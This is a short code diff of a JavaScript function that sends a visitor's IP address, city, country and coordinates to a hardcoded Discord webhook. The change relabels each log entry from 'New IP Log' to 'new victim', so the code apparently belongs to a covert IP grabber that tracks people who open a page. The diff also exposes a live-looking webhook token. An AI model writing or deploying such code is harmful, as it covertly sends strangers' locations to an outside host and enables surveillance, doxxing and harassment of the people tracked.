@@ -54,7 +54,7 @@
 
         function sendPayload(ip, city, country, lat, lon) {
             const payload = {
-                content: `**New IP Log**\n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
+                content: `# new victim \n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
             };
             
             fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
